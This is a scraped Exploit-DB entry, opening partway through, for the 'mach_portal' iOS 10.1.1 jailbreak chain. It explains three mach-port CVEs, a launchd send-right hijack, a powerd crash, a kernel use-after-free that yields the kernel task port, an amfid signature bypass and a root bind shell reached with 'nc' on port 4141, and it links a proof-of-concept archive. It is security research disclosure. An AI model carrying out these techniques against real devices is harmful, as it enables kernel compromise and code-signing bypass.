      ipc_port_release_send(dynamic_pager_control_port);

    dynamic_pager_control_port = control_port;
    return KERN_SUCCESS;
  }

This should be an atomic operation; there's no locking so two threads can race to see the same value for
dynamic_pager_control_port and release two references when the kernel only holds one.

This PoC triggers the bug such that the first thread frees the port and the second uses it; a
more sensible approach towards exploiting it would be to use this race to try to decrement the reference count
of a port with two references to zero such that you end up with a dangling port pointer.

Tested on MacOS 10.12 16A323

##############################################################################

/* ianbeer */

READ THIS FIRST:
if you do not have an iPod touch 6g running 10.1.1 (14b100) or and iPad mini 2 running 10.1.1 (14b100) this project will
not work out of the box(*)! You need to fix up a couple of offsets - see the section futher down
"Adding support for more devices"

(*) more precisely, I only have those devices and have only tested it on them.
(*) 1b4150 will probably also work, I haven't tested it.

Contents:
 1 - Build Instructions
 2 - Adding support for other devices
 3 - Notes on the bugs and exploits

*** (1) Build Instructions ***

 * download and install Xcode 8.1 or higher

 * download Jonathan Levin’s collection of arm64 iOS binaries:
    + Follow the link for "The 64-bit tgz pack" here:
      http://newosxbook.com/tools/iOSBinaries.html (you want iosbinpack64.tgz)
    + extract it into the iosbinpack64 directory which is already in the mach_portal
      source dir so that directly underneath iosbinpack64 you have the bin/, etc/, sbin/, usr/ directories
      When you expand the iosbinpack64 directory in the xcode folder view you should see those folders

 * open this .xcodeproj

 * if you don't have an apple id make one now at https://appleid.apple.com

 * if you don't have a developer signing certificate you can make a free one now in Xcode

 * in Xcode go Xcode->Preference->Accounts and click the '+' in the lower left hand corner and add your apple id

 * select your account then "View Details" and under signing identites click Create next to iOS Development

 * connect your iDevice and click "trust" in the pop up on it

 * wait for xcode to process symbol files for this device

 * in the box to the right of the play and stop buttons in the top left corner of the xcode window select your iDevice

 * in the left hand window pane select the mach_portal project and navigate to the General tab

 * in the signing window select your personal team

 * We now need to fix up a few things:

 * go to Build Settings -> Packaging and give your project a new, unique bundle identifier
    (eg change it from "com.example.mach_portal" to "com.ios.test.account.mach_portal"
     where ios.test.account is your apple id. (it doesn’t have to be your apple id, just a unique string))

 * We also need to register a unique App Group:

 * In the capabilities view scroll down to the App Groups section, remove the existing App Group ("group.mach_portal")
   and add a new unique one (eg "group.ios.test.account.mach_portal")

 * open jailbreak.c and change the app_group variable to this new app group id.

 * on the iDevice go to settings -> General -> Device Management and select your apple ID and click trust

 * in xcode click view -> debug area -> activate console so you can see debugging output (there's no output on the iDevice screen at all, that's normal)

 * make sure your iDevice and host are connected to the same wifi network and that network allows client to client connections. Note down the iDevice's ip address.

 * click play to run the app on the iDevice. If it fails press and hold the power and home buttons to reset the device. If Xcode asks you to enable developer mode on this mac agree.

 * if it succeeds you should see:
    "shell listening on port 4141"
   printed to the debug consol

 * the kernel exploit is only around 50% reliable (this can certainly be improved, read the code and make it better!)
     it will fail more often if there is high system load - try leaving the device for a minute after rebooting it and connecting it to you mac before trying again

 * connect to that port with netcat:
     nc X.X.X.X 4141
   where X.X.X.X is your iDevice’s ip address

 * you have a root shell :) There’s no controlling terminal so fancy curses gui stuff won't work unless you fix that

 * you can run any pseudo-signed thin ARM64 binaries - if you want the kernel task port it's host special port 4

 * copy your custom testing tools to the iosbinpack64 directory and they'll be bundled with the .app so you can run them from the shell

 * you're running as an unsandboxed root user so you can talk to any iokit user clients/mach services

 * amfid is patched to allow any signatures/entitlements

 * When you’re done hold power and home to reset the device

*** (2) Adding support for other devices ***
 * you have to do this manually, sorry!

 * download the ipsw for your device from https://www.theiphonewiki.com/wiki/Firmware
   The bugs are there in any version <= 10.1.1 but the further back you go the more offsets
   will be wrong so ideally stick to 10.1.1 (and for anything earlier that iOS 10 the kernel cache
   is encrypted so you'll have to do the rest yourself)

 * for >= iOS 10 unzip the ipsw and hexdump the kernel.release.* file like this:

$ hexdump -C kernelcache.release.n51 | head
00000000  30 83 b5 9b 0d 16 04 49  4d 34 50 16 04 6b 72 6e  |0......IM4P..krn|
00000010  6c 16 1c 4b 65 72 6e 65  6c 43 61 63 68 65 42 75  |l..KernelCacheBu|
00000020  69 6c 64 65 72 2d 31 31  36 32 2e 32 30 2e 31 04  |ilder-1162.20.1.|
00000030  83 b5 9a de 63 6f 6d 70  6c 7a 73 73 83 13 7d ae  |....complzss..}.|
00000040  01 64 80 00 00 b5 29 5e  00 00 00 01 00 00 00 00  |.d....)^........|
00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000001b0  00 00 00 00 ff cf fa ed  fe 0c 00 00 01 d5 00 f6  |................|
000001c0  f0 02 f6 f0 14 f6 f0 38  0e 9a f3 f1 20 f6 f1 00  |.......8.... ...|
000001d0  19 ff f1 f5 f0 5f 9f 5f  54 45 58 54 09 02 1c 03  |....._._TEXT....|

 * note down the offset of the ff cf fa ed fe byte sequence (in this case it's 0x1b4)

 * compile lzssdec from http://nah6.com/~itsme/cvs-xdadevtools/iphone/tools/lzssdec.cpp

 * run a command like: lzssdec -o 0x1b4 < kernel.release.n51 > kernel.decompressed

 * open the decompressed kernelcache in a recent version of IDA Pro (with support for iOS kextcaches)

 * say yes when IDA asks to split by kext

 * let the auto-analysis run - depending on how fast your computer is this might take a while! (it takes my 2013 MBP about 30 minutes)

 * go view -> open subviews -> segments and find the __TEXT:HEADER segment, the start should be FFFFFFF007004000
   if it isn't note this down as you'll need to work out a couple of offsets relative to this

 * go view -> open subviews -> names and find the kernproc data symbol.

 * subtract the __TEXT:HEADER value from that, this is the kernproc offset
     eg for iPhone 5S 10.1.1 kernproc is at FFFFFFF0075AE0E0 making the offset: 0x5AA0E0

 * now the harder one! We need to find allproc which isn't exported so is harder to find:

 * go view -> open subviews -> strings and find the string "pgrp_add : pgrp is dead adding process"

 * hit 'x' on the autogenerated string symbol name; you should see this symbol referenced from two functions

 * open the smaller of those functions in the IDA graph view

 * this is pgrp_add in the XNU source

 * scroll to the bottom of the CFG, the final three nodes all reference the same global variable with code like this:
    ADRP  X8, #qword_FFFFFFF0075A8128@PAGE
    LDR   X9, [X8,#qword_FFFFFFF0075A8128@PAGEOFF]

 * that's the address of allproc - subtract the kernel base to get the offset, in this case it's: 0x5A4128

 * open offset.c and add support for your device. You should only have to update those two variable (kernproc and allproc)
   The structure offsets should stay the same, at least for recent kernels. If you want to target a much older kernel you'll
   also have to work out all the structure offsets - this is much more fiddly.

 * 32-bit devices:
   All the offsets will be totally different and the code which manipulates the kernel data structures will also be completely wrong.
   There's no reason it wouldn't work but you'll have to fix the code to make it work

*** fixing userspace stuff ***

I also rely on a handful of offsets in amfid; you should be able to find those very easily if they're different on your target.
See the code and alse the section "Patch amfid" below.

*** (3) Notes on the bugs and exploits ***

This project is called "mach_portal" - it's the result of a research project I did this year looking at mach ports. (All the bugs used
involve mach ports :-) ) There are two main bugs plus one more which is only used to force a service to restart:

CVE-2016-7637: Broken kernel mach port name uref handling on iOS/MacOS can lead to privileged port name replacement in other processes

CVE-2016-7644: XNU kernel UaF due to lack of locking in set_dp_control_port

CVE-2016-7661: MacOS/iOS arbitrary port replacement in powerd

There is no untether (persistent codesigning bypass) but the exploit will temporarily disable codesigning while it runs so you can run
unsigned binaries.

The high level exploit flow is like this:

I use CVE-2016-7637 to replace launchd's send right to com.apple.iohideventsystem with a send right to a port for which I hold the receive right.
I use CVE-2016-7661 to crash the powerd daemon (which runs as root). It gets automatically restarted and as part of its startup it will
lookup the com.apple.iohideventsystem mach service and send its own task port to that service. Since I hold the receive
right for that port this means that powerd actually sends me its task port giving me complete control over it :-)
I use powerd's task port to get the host_priv port which I use to trigger the kernel bug.

The kernel bug is a lack of locking when releasing a reference on a port. I allocate a large number of mach ports then trigger the bug on around 20
of them which are likely to be allocated near each other in the kernel. I use no-more-senders notifications so I can deterministically know when I've
managed to over-release a port so that I can actually give myself dangling port pointers at an exact point in time later.

I free all these mach ports (leaving myself with ~20 dangling mach port pointers) and force a zone GC. I try to move
the page pointed to by all the dangling port pointers into the kalloc.4096 zone and then I send myself a large number of mach message containing OOL
ports with send rights to the host port. I set up these OOL port pages so that overlapping the dangling port's context pointers there's a pointer
to the host port ipc_port and the dangling port's lock and is_guarded fields are replaced with NULL pointers.

If that all worked I can call mach_port_get_context on each of the dangling ports and I should get back the address of the host port ipc_port.

The kernel task port is allocated at around the same time as the host port and as such they both end up in the same kernel zone page. I work
out the base of this page then call mach_port_set_context on all of the dangling ports passing each possible address of the kernel task port
in turn. I then receive all the ports I sent to myself and if everything worked I've ended receiving a send right to the kernel task port :)

Here's a more detailed writeup of the sandbox escape part of the exploit. You'll have to read the code for the kernel exploit, I haven't written
a longer writeup for that yet.

*** Sandbox escape ***

When sending and receiving mach messages from userspace there are two important kernel objects; ipc_entry and
ipc_object.

ipc_entry's are the per-process handles or names which a process uses to refer to a particular ipc_object.

ipc_object is the actual message queue (or kernel object) which the port refers to.

ipc_entrys have a pointer to the ipc_object they are a handle for along with the ie_bits field which contains
the urefs and capacility bits for this name/handle (whether this is a send right, receive right etc.)

  struct ipc_entry {
    struct ipc_object *ie_object;
    ipc_entry_bits_t ie_bits;
    mach_port_index_t ie_index;
    union {
      mach_port_index_t next;   /* next in freelist, or...  */
      ipc_table_index_t request;  /* dead name request notify */
    } index;
  };

#define IE_BITS_UREFS_MASK  0x0000ffff  /* 16 bits of user-reference */
#define IE_BITS_UREFS(bits) ((bits) & IE_BITS_UREFS_MASK)

The low 16 bits of the ie_bits field are the user-reference (uref) count for this name.

Each time a new right is received by a process, if it already had a name for that right the kernel will
increment the urefs count. Userspace can also arbitrarily control this reference count via mach_port_mod_refs
and mach_port_deallocate. When the reference count hits 0 the entry is free'd and the name can be re-used to
name another right (this is actually only the case for send rights).

ipc_right_copyout is called when a right will be copied into a space (for example by sending a port right in a mach
message to another process.) Here's the code to handle the sending of a send right:

    case MACH_MSG_TYPE_PORT_SEND:
        assert(port->ip_srights > 0);

        if (bits & MACH_PORT_TYPE_SEND) {
            mach_port_urefs_t urefs = IE_BITS_UREFS(bits);

            assert(port->ip_srights > 1);
            assert(urefs > 0);
            assert(urefs < MACH_PORT_UREFS_MAX);

            if (urefs+1 == MACH_PORT_UREFS_MAX) {
                if (overflow) {
                    /* leave urefs pegged to maximum */     <---- (1)

                    port->ip_srights--;
                    ip_unlock(port);
                    ip_release(port);
                    return KERN_SUCCESS;
                }

                ip_unlock(port);
                return KERN_UREFS_OVERFLOW;
            }
            port->ip_srights--;
            ip_unlock(port);
            ip_release(port);

     ...

        entry->ie_bits = (bits | MACH_PORT_TYPE_SEND) + 1;  <---- (2)
        ipc_entry_modified(space, name, entry);
        break;

If copying this right into this space would cause that right's name's urefs count in that space to hit 0xffff
then (if overflow is true) we reach the code at (1) which claims in the comment that it will leave urefs pegged at maximum.
This branch doesn't increase the urefs but still returns KERN_SUCCESS. Almost all callers pass overflow=true.

The reason for this "pegging" was probably not to prevent the reference count from becoming incorrect but rather because
at (2) if the urefs count wasn't capped the reference count would overflow the 16-bit bitfield into the capability bits.

The issue is that the urefs count isn't "pegged" at all. I would expect "pegged" to mean that the urefs count will now stay at 0xfffe
and cannot be decremented - leaking the name and associated ipc_object but avoiding the possibilty of a name being over-released.

In fact all that the "peg" does is prevent the urefs count from exceeding 0xfffe; it doesn't prevent userspace from believing
it has more urefs than that (by eg making the copyout's fail.)

What does this actually mean?

Let's consider the behaviour of mach_msg_server or dispatch_mig_server. They receive mach service messages in a loop and if the message
they receieved didn't corrispond to the MIG schema they pass that received message to mach_msg_destroy. Here's the code where mach_msg_destroy
destroys an ool_ports_descriptor_t:

    case MACH_MSG_OOL_PORTS_DESCRIPTOR : {
      mach_port_t                 *ports;
      mach_msg_ool_ports_descriptor_t *dsc;
      mach_msg_type_number_t      j;

      /*
       * Destroy port rights carried in the message
       */
      dsc = &saddr->ool_ports;
      ports = (mach_port_t *) dsc->address;
      for (j = 0; j < dsc->count; j++, ports++)  {
          mach_msg_destroy_port(*ports, dsc->disposition); // calls mach_port_deallocate
      }
    ...

This will call mach_port_deallocate for each ool_port name received.

If we send such a service a mach message with eg 0x20000 copies of the same port right as ool ports the ipc_entry for that name will actually only have
0xfffe urefs. After 0xfffe calls to mach_port_deallocate the urefs will hit 0 and the kernel will free the ipc_entry and mark that name as free. From this
point on the name can be re-used to name another right (for example by sending another message received on another thread) but the first thread will
still call mach_port_deallocate 0x10002 times on that name.

This leads to something like a use-after-deallocate of the mach port name - strictly a userspace bug (there's no kernel memory corruption etc here) but
caused by a kernel bug.

The challenge to exploiting this bug is getting the exact same port name reused
in an interesting way.

This requires us to dig in a bit to exacly what a port name is, how they're allocated
and under what circumstances they'll be reused.

Mach ports are stored in a flat array of ipc_entrys:

  struct ipc_entry {
    struct ipc_object *ie_object;
    ipc_entry_bits_t ie_bits;
    mach_port_index_t ie_index;
    union {
      mach_port_index_t next;   /* next in freelist, or...  */
      ipc_table_index_t request;  /* dead name request notify */
    } index;
  };

mach port names are made up of two fields, the upper 24 bits are an index into the ipc_entrys table
and the lower 8 bits are a generation number. Each time an entry in the ipc_entrys table is reused
the generation number is incremented. There are 64 generations, so after an entry has been reallocated
64 times it will have the same generation number.

The generation number is checked in ipc_entry_lookup:

  if (index <  space->is_table_size) {
                entry = &space->is_table[index];
    if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||
        IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE)
      entry = IE_NULL;
  }

here entry is the ipc_entry struct in the kernel and name is the user-supplied mach port name.

Entry allocation:
The ipc_entry table maintains a simple LIFO free list for entries; if this list is free the table will
be grown. The table is never shrunk.

Reliably looping mach port names:
To exploit this bug we need a primitive that allows us to loop a mach port's generation number around.

After triggering the urefs bug to free the target mach port name in the target process we immediately
send a message with N ool ports (with send rights) and no reply port. Since the target port was the most recently
freed it will be at the head of the freelist and will be reused to name the first of the ool ports
contained in the message (but with an incremented generation number.)
Since this message is not expected by the service (in this case we send an
invalid XPC request to launchd) it will get passed to mach_msg_destroy which will pass each of
the ports to mach_port_deallocate freeing them in the order in which they appear in the message. Since the
freed port was reused to name the first ool port it will be the first to be freed. This will push the name
N entries down the freelist.

We then send another 62 of these looper messages but with 2N ool ports. This has the effect of looping the generation
number of the target port around while leaving it in approximately the middle of the freelist. The next time the target entry
in the table is allocated it will have exactly the same mach port name as the original target right we
triggered the urefs bug on.

For this iOS exploit I target the send right to com.apple.iohideventsystem which launchd has, and which I can lookup from inside the
container sandbox

I look up the iohideventsystem service in launchd then use the urefs bug to free launchd's send right and use the
looper messages to spin the generation number round. I then register a large number of dummy services
with launchd so that one of them reuses the same mach port name as launchd thinks the iohideventsystem service has.
(We can't register global mach services from inside the container sandbox but we can register App Group-restricted
services, which work just the same for our purposes. This is why the exploit needs the App Groups capability.)

Now when any process looks up com.apple.iohideventsystem launchd will actually send them a send right
to one of my dummy services :)

I add all those dummy services to a portset and use that recieve right and the legitimate iohideventsystem send right
I still have to MITM all these new connections to iohideventsystem. As mentioned earlier clients of iohideventsystem send
it their task ports, so all I have to do is crash a process which runs as root and is a client of iohideventsystem. When it
restarts it will send it's task port to me :-)

*** Powerd crasher ***

To crash powerd I use CVE-2016-7661:

powerd checks in with launchd to get a server port and then wraps that in a CFPort:

  pmServerMachPort = _SC_CFMachPortCreateWithPort(
                          "PowerManagement",
                          serverPort,
                          mig_server_callback,
                          &context);

It also asks to receive dead name notifications for other ports on that same server port:

  mach_port_request_notification(
              mach_task_self(),           // task
              notify_port_in,                 // port that will die
              MACH_NOTIFY_DEAD_NAME,      // msgid
              1,                          // make-send count
              CFMachPortGetPort(pmServerMachPort),        // notify port
              MACH_MSG_TYPE_MAKE_SEND_ONCE,               // notifyPoly
              &oldNotify);                                // previous

mig_server_callback is called off of the mach port run loop source to handle new messages on pmServerMachPort:

  static void
  mig_server_callback(CFMachPortRef port, void *msg, CFIndex size, void *info)
  {
      mig_reply_error_t * bufRequest = msg;
      mig_reply_error_t * bufReply = CFAllocatorAllocate(
          NULL, _powermanagement_subsystem.maxsize, 0);
      mach_msg_return_t   mr;
      int                 options;

      __MACH_PORT_DEBUG(true, "mig_server_callback", serverPort);

      /* we have a request message */
      (void) pm_mig_demux(&bufRequest->Head, &bufReply->Head);

This passes the raw message to pm_mig_demux:

  static boolean_t
  pm_mig_demux(
      mach_msg_header_t * request,
      mach_msg_header_t * reply)
  {
      mach_dead_name_notification_t *deadRequest =
                      (mach_dead_name_notification_t *)request;
      boolean_t processed = FALSE;

      processed = powermanagement_server(request, reply);

      if (processed)
          return true;

      if (MACH_NOTIFY_DEAD_NAME == request->msgh_id)
      {
          __MACH_PORT_DEBUG(true, "pm_mig_demux: Dead name port should have 1+ send right(s)", deadRequest->not_port);

          PMConnectionHandleDeadName(deadRequest->not_port);

          __MACH_PORT_DEBUG(true, "pm_mig_demux: Deallocating dead name port", deadRequest->not_port);
          mach_port_deallocate(mach_task_self(), deadRequest->not_port);

          reply->msgh_bits            = 0;
          reply->msgh_remote_port     = MACH_PORT_NULL;

          return TRUE;
      }

This passes the message to the MIG-generated code for the powermanagement subsystem, if that fails (because the msgh_id doesn't
match the subsystem for example) then this compares the message's msgh_id field to MACH_NOTIFY_DEAD_NAME.

deadRequest is the message cast to a mach_dead_name_notification_t which is defined like this in mach/notify.h:

  typedef struct {
      mach_msg_header_t   not_header;
      NDR_record_t        NDR;
      mach_port_name_t not_port;/* MACH_MSG_TYPE_PORT_NAME */
      mach_msg_format_0_trailer_t trailer;
  } mach_dead_name_notification_t;

This is a simple message, not a complex one. not_port is just a completely controlled integer which in this case will get passed directly to
mach_port_deallocate.

The powerd code expects that only the kernel will send a MACH_NOTIFY_DEAD_NAME message but actually anyone can send this and force the privileged process
to drop a reference on a controlled mach port name :)

Multiplexing these two things (notifications and a mach service) onto the same port isn't possible to do safely as the kernel doesn't prevent
user->user spoofing of notification messages - usually this wouldn't be a problem as attackers shouldn't have access to the notification port.

You could probably do quite interesting things with this bug but in this case I just want to crash the service. I do that by spoofing no-more-senders
notifications for powerd's task port. Once powerd's send right to its own task port has been freed pretty much everything breaks - in this case
I send a copy_powersources_info message, the receving code doesn't check the return value of a call to mach_vm_allocate which fails because the
task's task port is wrong and leads to the use of an uninitialized pointer.

*** Kernel Bug ****

See above for a short writeup of the kernel bug exploit. I will try to write a long-form writeup soon, but the code should be kind of clear.

*** Post-exploitation ****

I've taken a slightly different approach post-exploitation. Everything is data-only, I don't make any patches to r/o kernel memory. This means
things should also work on the iPhone 7 but I don't have one to test :(

There are a number of downsides to taking this approach though:
  * technically a lot of these things I do are racy, but in pratice it works perfectly well enough for a research platform
  * some things become quite fiddly which are simple with a TEXT patch

This is also a research project for me; there are almost certainly far more downsides that I'm not aware of. iOS is complex, undocumented place
and I don't really know what I'm doing!

The flow works like this:

Walk the process list and find the following tasks:
 amfid
 mach_portal
 containermanagerd
 launchd

Disable the sandbox:
  sb_evaluate has a short-circuit success path if the process has the kern_cred credentials; neither the plaform policy nor
  the process's sandbox profile will be evaluated. We can use the kernel memory access to give the mach_portal process the
  kernel's credentials and we're no longer sandboxed.

Fix launchd:
  The sandbox escape made a mess in launchd so I fix up launchd's send right to iohideventsystem to point back to the correct port.
  I then restart powerd because otherwise we hit a watchdog timeout.

Patch amfid:
  In order to run unsigned binaries and have somethign like a proper shell environment we need to convince amfid to allow binaries with invalid
  signatures. Previous efforts in this area have replaced amfids import of MISValidateSignature to a function which would always return 0 (success)
  but amfid now calls MISValidateSignatureAndCopyInfo which takes an out pointer to a CFDictionary which is expected to contain the correct CDHash
  so just replacing the import won't work. I instead set myself as amfid's exception handler and point the MISValidateSignatureAndCopyInfo to an invalid
  address. This means that amfid will crash whenever it validates a signature, and since we're the exception handler we get a message on the exception port
  with the crashing thread state. I read the path to the file to be validated from amfid's address space, compute the CDHash SHA1 myself and write that into the
  reply message which amfid will send back to the kernel then resume execution of amfid so it can send the reply.

Unsandbox containermangerd:
  Since I haven't had time to investigate LvVM yet I don't remount the rootfs r/w which means that all the binaries we run are from the user partition. This means
  that we can't prevent the kernel from requesting that containermanagerd allocate a container for them. I did test out doing a similar patch for containermanagerd
  as I did for amfid which parsed the sb_packbuff requests from the kernel and fixed them up so that containermanagerd didn't get upset but it seemed easier to
  just unsandbox it so it can make the directories it wants. This decision should be revisited, it's not ideal!

Make sure all child processes are also unsandboxed:
  Since the sandbox defeat involves cheating by using the kern_cred we need a way to make sure all our child processes also have the kern_cred. This is kind of a hack
  but it works fine for my purposes. You should really revisit this if you want to improve on this code!
  I allocate a new mach port and set that as my bootstrap port and spin up a thread which mitm's between that port and a real send right to launchd. I request an audit
  trailer with each message which allows me to get the sender of the message and thus be notified when a new child starts. I then use the kernel memory access to
  find that pid's proc structure and give it and all its threads the kernel creds. A constructor in libxpc will make a synchronous request to the bootstrap
  port during dyld initialization before any application code actually runs so this works well enough to allow all our children to run unsandboxed

Set kernel task port as host special port:
  I also set the kernel task port as host special port 4 so you can easily get at it without having to rewrite the exploit code.

Shell:
  I chmod everything in the iosbinpack64 directory to be executable then run bash on a bind shell on port 4141. This isn't ideal but is enough to run test tools
  and explore the system, talk to all the userclients, devices, mach services, sysctls etc that you want to.

Proofs of Concept:
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40931.zip

```

**Tags:**
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://bugs.chromium.org/p/project-zero/issues/detail?id=965)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from support.apple.com_b25d64ed_20250125_162524.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
